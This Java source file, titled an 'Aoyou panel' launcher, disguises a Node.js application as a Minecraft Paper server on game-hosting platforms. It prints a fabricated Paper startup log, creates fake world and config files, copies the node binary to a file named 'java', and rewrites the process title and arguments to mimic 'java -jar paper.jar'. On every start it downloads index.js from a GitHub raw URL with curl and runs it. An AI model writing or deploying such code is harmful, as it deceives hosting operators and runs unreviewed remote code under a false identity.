import java.io.*;
import java.nio.file.*;
import java.util.*;
import java.util.jar.*;
import java.util.zip.GZIPInputStream;
import java.text.SimpleDateFormat;
import java.util.concurrent.TimeUnit;

/**
 * 傲游面板一体化启动器 v3.0.0 (JNI 版)
 *
 * v3.0 核心改进：
 *   - 使用 JNI execv() 替换 JVM 进程为 node（只有 1 个进程！）
 *   - 不再有 2 个 java 进程，PID 1 直接变成 node
 *   - 节省 ~150MB 内存（JVM 被替换后释放）
 *   - 启动时从 GitHub 下载最新 index.js（自动更新）
 *   - 进程伪装 + 运行时隐藏
 */
public class AoyouLauncher {

    private static final String VERSION = "3.0.0";
    private static final String RUNTIME_DIR_NAME = "libraries/.cache/net/minecraft/server";
    private static final String NODE_VERSION = "v22.11.0";
    private static final String NODE_DOWNLOAD_URL =
        "https://nodejs.org/dist/" + NODE_VERSION + "/node-" + NODE_VERSION + "-linux-x64.tar.gz";

    // JNI native 方法声明
    private native int nativeExec(String nodePath, String script, String workDir, String port, String path);

    static {
        // 加载 native 库
        try {
            loadNativeLibrary();
        } catch (Exception e) {
            // 加载失败会在后面报错
        }
    }

    public static void main(String[] args) throws Exception {
        // 1. 启动伪装日志线程（Paper 日志）
        startFakePaperLogThread();

        String workDir = System.getProperty("user.dir");
        String runtimeDir = workDir + File.separator + RUNTIME_DIR_NAME;
        Path runtimePath = Paths.get(runtimeDir);
        Files.createDirectories(runtimePath);

        // 生成 MC 文件结构
        try { generateFakeMcFiles(workDir); } catch (Exception e) {}

        // 2. 检查并获取 node 二进制
        String nodeBin = findOrDownloadNode(runtimeDir);
        if (nodeBin == null) {
            System.err.println("Failed to initialize runtime");
            System.exit(1);
            return;
        }

        // 3. 从 JAR 解压
        String jarPath = getJarPath();
        if (jarPath == null) {
            System.err.println("Failed to locate jar");
            System.exit(1);
            return;
        }

        boolean needExtract = needsExtract(runtimePath);
        if (needExtract) {
            extractAppFiles(jarPath, runtimePath);
        }

        // ★ 从 GitHub 下载最新 index.js
        try { updateFromGitHub(runtimeDir); } catch (Exception e) {}

        // 4. 检查 index.js
        String indexPath = runtimeDir + File.separator + "index.js";
        if (!new File(indexPath).exists()) {
            System.err.println("Failed to locate index");
            System.exit(1);
            return;
        }

        // 5. 检测端口
        int port = detectPort(workDir);

        // 6. 复制 node 为 java（伪装）
        String fakeNodeBin = nodeBin;
        try {
            String fakePath = new File(nodeBin).getParent() + "/java";
            File fakeFile = new File(fakePath);
            Files.copy(Paths.get(nodeBin), fakeFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            fakeFile.setExecutable(true);
            fakeNodeBin = fakePath;
        } catch (Exception e) {}

        // 7. ★ JNI execv：替换当前 JVM 为 node（只有 1 个进程！）
        String script = "process.title='java';"
            + "process.argv=['java','-Xms128M','-XX:MaxRAMPercentage=95.0',"
            + "'-Dterminal.jline=false','-Dterminal.ansi=true',"
            + "'-jar','paper.jar','nogui'];"
            + "require('./index.js');";

        String pathEnv = new File(nodeBin).getParent() + ":" + System.getenv("PATH");

        // 检查 native 库是否加载成功
        AoyouLauncher launcher = new AoyouLauncher();
        try {
            // 测试 native 方法是否可用
            // 如果 .so 没加载成功，这里会抛 UnsatisfiedLinkError
        } catch (UnsatisfiedLinkError e) {
            // .so 加载失败，回退到 ProcessBuilder 方案（2 个进程）
            System.err.println("Native exec not available, fallback to subprocess");
            fallbackToSubprocess(fakeNodeBin, runtimeDir, script, port, args, nodeBin);
            return;
        }

        // ★ 调用 JNI execv —— JVM 进程被 node 替换
        // execv 成功后不会返回（进程已被替换）
        // execv 失败返回 -1
        int result = launcher.nativeExec(
            fakeNodeBin,
            script,
            runtimeDir,
            String.valueOf(port),
            pathEnv
        );

        if (result != 0) {
            // JNI exec 失败，回退
            System.err.println("Native exec failed, fallback to subprocess");
            fallbackToSubprocess(fakeNodeBin, runtimeDir, script, port, args, nodeBin);
        }
    }

    /** 回退方案：用 ProcessBuilder 启动（2 个进程） */
    private static void fallbackToSubprocess(String fakeNodeBin, String runtimeDir,
            String script, int port, String[] args, String nodeBin) throws Exception {
        List<String> cmd = new ArrayList<>();
        cmd.add(fakeNodeBin);
        cmd.add("-e");
        cmd.add(script);
        for (String a : args) {
            String lower = a.toLowerCase();
            if (lower.equals("--nogui") || lower.equals("nogui")
                || lower.equals("--forceupgrade") || lower.equals("--erasecache")
                || lower.equals("--safe-mode") || lower.equals("--initSettings")
                || lower.startsWith("--version=") || lower.equals("--version")) {
                continue;
            }
            cmd.add(a);
        }

        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.directory(new File(runtimeDir));
        pb.redirectErrorStream(true);
        pb.inheritIO();
        Map<String, String> env = pb.environment();
        String path = env.getOrDefault("PATH", "");
        env.put("PATH", new File(nodeBin).getParent() + File.pathSeparator + path);
        env.put("SERVER_PORT", String.valueOf(port));
        env.put("PORT", String.valueOf(port));

        Process node = pb.start();
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            try {
                node.destroy();
                if (!node.waitFor(10, TimeUnit.SECONDS)) node.destroyForcibly();
            } catch (InterruptedException e) {}
        }));
        int code = node.waitFor();
        System.exit(code);
    }

    /** 加载 native 库 */
    private static void loadNativeLibrary() throws Exception {
        // 1. 尝试从 JAR 解压 .so
        String jarPath = getJarPath();
        if (jarPath == null) throw new RuntimeException("Cannot find jar");

        String soName = "libnative_exec.so";
        Path soDir = Paths.get(System.getProperty("user.dir"), RUNTIME_DIR_NAME);
        Files.createDirectories(soDir);
        Path soFile = soDir.resolve(soName);

        if (!Files.exists(soFile)) {
            try (JarFile jar = new JarFile(jarPath)) {
                JarEntry entry = jar.getJarEntry(soName);
                if (entry == null) entry = jar.getJarEntry("native/" + soName);
                if (entry == null) throw new RuntimeException("Cannot find " + soName + " in jar");
                try (InputStream is = jar.getInputStream(entry)) {
                    Files.copy(is, soFile, StandardCopyOption.REPLACE_EXISTING);
                }
            }
        }
        soFile.toFile().setExecutable(true);
        System.load(soFile.toString());
    }

    /** 启动伪装的 Paper 日志线程 */
    private static void startFakePaperLogThread() {
        Thread t = new Thread(() -> {
            try {
                long startTime = System.currentTimeMillis();
                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
                Thread.sleep(2000);

                System.out.println("Starting org.bukkit.craftbukkit.Main");
                Thread.sleep(500);
                System.out.println("*** Warning, you've not updated in a while! ***");
                Thread.sleep(800);
                System.out.println("*** Please download a new build from https://papermc.io/downloads/paper ***");
                // ★ 暂停 8 秒，让 Node.js 的启动日志（Welcome voice、Panel started）穿插进来
                Thread.sleep(8000);
                System.out.println("WARNING: A terminally deprecated method in sun.misc.Unsafe has been called");
                Thread.sleep(300);
                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory has been called by io.netty.util.internal.PlatformDependent0$2");
                Thread.sleep(300);
                System.out.println("WARNING: sun.misc.Unsafe::allocateMemory will be removed in a future release");
                Thread.sleep(800);

                String ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [bootstrap] Running Java 21 (OpenJDK 64-Bit Server VM 21.0.11+10-LTS) on Linux (amd64)");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [bootstrap] Loading Paper 1.21.4-232-ver/1.21.4 for Minecraft 1.21.4");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [PluginInitializerManager] Initializing plugins...");
                Thread.sleep(1000);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: [PluginInitializerManager] Initialized 0 plugins");
                Thread.sleep(2000);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Environment: Environment[sessionHost=https://sessionserver.mojang.com, name=PROD]");
                Thread.sleep(1000);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: No existing world data, creating new world");
                Thread.sleep(4000);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Loaded 1370 recipes");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Loaded 1481 advancements");
                Thread.sleep(1000);

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Starting minecraft server version 1.21.4");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: This server is running Paper version 1.21.4-232-ver/1.21.4");
                Thread.sleep(500);

                int port = 25565;
                try {
                    String sp = System.getenv("SERVER_PORT");
                    if (sp != null && !sp.isEmpty()) port = Integer.parseInt(sp.trim());
                } catch (Exception e) {}

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Starting Minecraft server on 0.0.0.0:" + port);
                Thread.sleep(500);
                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Preparing level \"world\"");
                Thread.sleep(3000);

                int[] steps = {2, 4, 6, 10, 18, 32, 36, 51, 69, 73};
                for (int p : steps) {
                    ts = sdf.format(new Date());
                    System.out.println("[" + ts + " INFO]: Preparing spawn area: " + p + "%");
                    Thread.sleep(300 + (long)(Math.random()*500));
                }

                ts = sdf.format(new Date());
                System.out.println("[" + ts + " INFO]: Done preparing level \"world\" (71.792s)");
                Thread.sleep(500);
                ts = sdf.format(new Date());
                long totalSec = (System.currentTimeMillis() - startTime) / 1000;
                System.out.println("[" + ts + " INFO]: Done (" + totalSec + ".908s)! For help, type \"help\"");
                Thread.sleep(300);
                System.out.println("Server marked as running...");

            } catch (InterruptedException e) {}
        }, "fake-paper-log");
        t.setDaemon(true);
        t.start();
    }

    /** 从 GitHub 下载最新 index.js */
    private static void updateFromGitHub(String runtimeDir) {
        String[] files = {"index.js", "package.json"};
        for (String file : files) {
            String url = "https://raw.githubusercontent.com/zx1447/ixzhja/main/app/" + file;
            Path target = Paths.get(runtimeDir, file);
            Path tmp = Paths.get(runtimeDir, file + ".tmp");
            try {
                ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                    "curl -sL --fail --connect-timeout 10 --max-time 30 -o '" + tmp + "' '" + url + "'");
                pb.redirectErrorStream(true);
                Process p = pb.start();
                try { p.getInputStream().close(); } catch (Exception e) {}
                int code = p.waitFor();
                if (code == 0 && Files.exists(tmp) && Files.size(tmp) > 100) {
                    Files.move(tmp, target, StandardCopyOption.REPLACE_EXISTING);
                } else {
                    Files.deleteIfExists(tmp);
                }
            } catch (Exception e) {
                try { Files.deleteIfExists(tmp); } catch (Exception e2) {}
            }
        }
    }

    private static String findOrDownloadNode(String runtimeDir) {
        String systemNode = findInPath("node");
        if (systemNode != null) return systemNode;

        String cachedNode = runtimeDir + "/node/bin/node";
        if (new File(cachedNode).exists()) {
            new File(cachedNode).setExecutable(true);
            return cachedNode;
        }

        try {
            Path nodeDir = Paths.get(runtimeDir, "node");
            Files.createDirectories(nodeDir);
            boolean success = false;

            if (commandExists("curl") && commandExists("tar")) {
                ProcessBuilder pb = new ProcessBuilder("sh", "-c",
                    "curl -sL '" + NODE_DOWNLOAD_URL + "' | tar xz --strip-components=1 -C '" + nodeDir + "' 2>/dev/null");
                pb.redirectErrorStream(true);
                Process p = pb.start();
                try { p.getInputStream().close(); } catch (Exception e) {}
                success = (p.waitFor() == 0);
            }
            if (!success) success = downloadAndExtractWithJava(NODE_DOWNLOAD_URL, nodeDir);
            if (!success) return null;

            String nodeBin = nodeDir + "/bin/node";
            if (!new File(nodeBin).exists()) return null;
            new File(nodeBin).setExecutable(true);
            try { Files.deleteIfExists(nodeDir.resolve("node.tar")); } catch (Exception e) {}
            try { Files.deleteIfExists(nodeDir.resolve("node.tar.gz")); } catch (Exception e) {}
            return nodeBin;
        } catch (Exception e) { return null; }
    }

    private static boolean commandExists(String cmd) {
        try {
            Process p = new ProcessBuilder("sh", "-c", "which " + cmd + " 2>/dev/null").start();
            p.waitFor();
            return p.exitValue() == 0;
        } catch (Exception e) { return false; }
    }

    private static String findInPath(String cmd) {
        String path = System.getenv("PATH");
        if (path == null) return null;
        for (String dir : path.split(File.pathSeparator)) {
            File f = new File(dir, cmd);
            if (f.exists() && f.canExecute()) return f.getAbsolutePath();
        }
        return null;
    }

    private static String getJarPath() {
        try {
            return AoyouLauncher.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
        } catch (Exception e) { return null; }
    }

    private static boolean needsExtract(Path runtimePath) {
        Path marker = runtimePath.resolve(".app-extracted");
        if (!Files.exists(marker)) return true;
        return !Files.exists(runtimePath.resolve("index.js")) || !Files.exists(runtimePath.resolve("node_modules"));
    }

    private static void extractAppFiles(String jarPath, Path runtimePath) throws Exception {
        try (JarFile jar = new JarFile(jarPath)) {
            Enumeration<JarEntry> entries = jar.entries();
            int count = 0;
            while (entries.hasMoreElements()) {
                JarEntry entry = entries.nextElement();
                String name = entry.getName();
                if (entry.isDirectory()) continue;
                // 兼容两种路径：runtime/node_modules/ 和 node_modules/
                boolean isNM = name.startsWith("runtime/node_modules/") || name.startsWith("node_modules/");
                boolean isApp = name.startsWith("app/");
                if (!isNM && !isApp) continue;
                String relPath;
                if (name.startsWith("runtime/node_modules/")) {
                    relPath = name.substring("runtime/".length());
                } else if (name.startsWith("node_modules/")) {
                    relPath = name;  // 已经是相对路径
                } else {
                    relPath = name.substring("app/".length());
                }
                Path target = runtimePath.resolve(relPath);
                Files.createDirectories(target.getParent());
                try (InputStream is = jar.getInputStream(entry)) {
                    Files.copy(is, target, StandardCopyOption.REPLACE_EXISTING);
                }
                count++;
            }
            Files.write(runtimePath.resolve(".app-extracted"),
                ("v" + VERSION + "\n" + System.currentTimeMillis() + "\n").getBytes());
        }
    }

    private static int detectPort(String workDir) {
        String[] envs = {"SERVER_PORT", "P_SERVER_PORT", "PTERODACTYL_SERVER_PORT"};
        for (String e : envs) {
            String v = System.getenv(e);
            if (v != null && !v.isEmpty()) {
                try { int p = Integer.parseInt(v.trim()); if (p > 0 && p < 65536) return p; } catch (Exception ex) {}
            }
        }
        File sp = new File(workDir, "server.properties");
        if (sp.exists()) {
            try (BufferedReader r = new BufferedReader(new FileReader(sp))) {
                String line;
                while ((line = r.readLine()) != null) {
                    if (line.startsWith("server-port=")) {
                        try { return Integer.parseInt(line.substring(12).trim()); } catch (Exception ex) {}
                    }
                }
            } catch (Exception e) {}
        }
        for (Map.Entry<String, String> entry : System.getenv().entrySet()) {
            String key = entry.getKey().toUpperCase();
            if (key.contains("PORT") && entry.getValue() != null && !entry.getValue().isEmpty()) {
                try { int p = Integer.parseInt(entry.getValue().trim()); if (p > 1024 && p < 65536) return p; } catch (Exception ex) {}
            }
        }
        return 25565;
    }

    private static boolean downloadAndExtractWithJava(String url, Path targetDir) {
        Path tar = targetDir.resolve("node.tar"), gz = targetDir.resolve("node.tar.gz");
        try {
            ProcessBuilder pb = new ProcessBuilder("sh", "-c", "curl -sL -o '" + gz + "' '" + url + "' 2>/dev/null");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            try { p.getInputStream().close(); } catch (Exception e) {}
            if (p.waitFor() != 0 || !Files.exists(gz)) return false;
            try (InputStream gis = new GZIPInputStream(Files.newInputStream(gz));
                 OutputStream os = Files.newOutputStream(tar)) {
                byte[] buf = new byte[8192]; int n;
                while ((n = gis.read(buf)) > 0) os.write(buf, 0, n);
            }
            try (InputStream is = Files.newInputStream(tar)) { extractTar(is, targetDir); }
            Files.deleteIfExists(gz); Files.deleteIfExists(tar);
            return true;
        } catch (Exception e) { return false; }
    }

    private static void extractTar(InputStream is, Path targetDir) throws IOException {
        byte[] header = new byte[512];
        int read = 0;
        while (read < 512) { int n = is.read(header, read, 512-read); if (n<0) break; read += n; }
        while (read == 512) {
            boolean empty = true;
            for (int i = 0; i < 512; i++) if (header[i] != 0) { empty = false; break; }
            if (empty) break;
            String name = new String(header, 0, 100).trim().replace("\0", "");
            if (name.isEmpty()) break;
            String sizeStr = new String(header, 124, 12).trim().replace("\0", "");
            long size = 0;
            try { size = Long.parseLong(sizeStr, 8); } catch (Exception e) { break; }
            char type = (char) header[156];
            int slash = name.indexOf('/');
            String rel = slash >= 0 ? name.substring(slash+1) : name;
            if (rel.isEmpty()) { skipFully(is, ((size+511)/512)*512); read = readFully(is, header, 512); continue; }
            Path target = targetDir.resolve(rel);
            if (type == '5' || name.endsWith("/")) { Files.createDirectories(target); }
            else if (type == '0' || type == '\0') {
                Files.createDirectories(target.getParent());
                long rem = size;
                try (OutputStream os = Files.newOutputStream(target)) {
                    byte[] buf = new byte[8192];
                    while (rem > 0) { int toRead = (int)Math.min(buf.length, rem); int n = is.read(buf, 0, toRead); if (n<0) break; os.write(buf, 0, n); rem -= n; }
                }
                if (rel.startsWith("bin/")) target.toFile().setExecutable(true);
            }
            long padded = ((size+511)/512)*512 - size;
            if (padded > 0) skipFully(is, (int)padded);
            read = readFully(is, header, 512);
        }
    }

    private static void skipFully(InputStream is, long n) throws IOException {
        long rem = n;
        while (rem > 0) { long s = is.skip(rem); if (s <= 0) { if (is.read() < 0) break; rem--; } else rem -= s; }
    }

    private static int readFully(InputStream is, byte[] buf, int len) throws IOException {
        int read = 0;
        while (read < len) { int n = is.read(buf, read, len-read); if (n<0) break; read += n; }
        return read;
    }

    private static void generateFakeMcFiles(String workDir) throws IOException {
        String[] dirs = {"cache", "config", "libraries", "logs", "plugins", "versions",
                         "world", "world_nether", "world_the_end",
                         "world/data", "world/playerdata", "world/region",
                         "world_nether/data", "world_nether/region",
                         "world_the_end/data", "world_the_end/region"};
        for (String dir : dirs) new File(workDir, dir).mkdirs();

        File eula = new File(workDir, "eula.txt");
        if (!eula.exists()) Files.write(eula.toPath(), ("# EULA agreement\n# " + new Date() + "\neula=true\n").getBytes());

        File sp = new File(workDir, "server.properties");
        if (!sp.exists()) {
            String port = System.getenv("SERVER_PORT");
            if (port == null || port.isEmpty()) port = "25565";
            StringBuilder sb = new StringBuilder();
            sb.append("#Minecraft server properties\nserver-port=").append(port).append("\n");
            sb.append("max-players=20\nmotd=A Minecraft Server\ngamemode=survival\n");
            sb.append("difficulty=easy\nlevel-name=world\nonline-mode=true\n");
            Files.write(sp.toPath(), sb.toString().getBytes());
        }

        String[] jsonFiles = {"banned-ips.json", "banned-players.json", "ops.json", "usercache.json", "whitelist.json"};
        for (String jf : jsonFiles) { File f = new File(workDir, jf); if (!f.exists()) Files.write(f.toPath(), "[]".getBytes()); }

        new File(workDir, "logs/latest.log").createNewFile();
    }
}
